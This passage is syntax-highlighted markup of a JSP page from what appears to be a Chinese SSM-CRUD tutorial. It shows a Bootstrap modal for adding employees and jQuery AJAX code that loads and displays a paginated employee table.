class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 员工添加的模态框 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>员工添加<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
